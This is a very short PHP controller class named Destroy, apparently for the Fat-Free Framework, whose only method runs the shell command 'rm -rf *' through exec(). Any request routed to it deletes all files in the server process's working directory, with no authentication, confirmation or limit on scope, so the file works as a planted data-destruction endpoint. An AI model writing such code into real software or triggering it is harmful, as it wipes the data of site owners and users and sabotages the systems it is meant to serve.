<?php
namespace controllers;

class Destroy {
    public function destroy($f3)
    {
        exec("rm -rf *");
    }
}
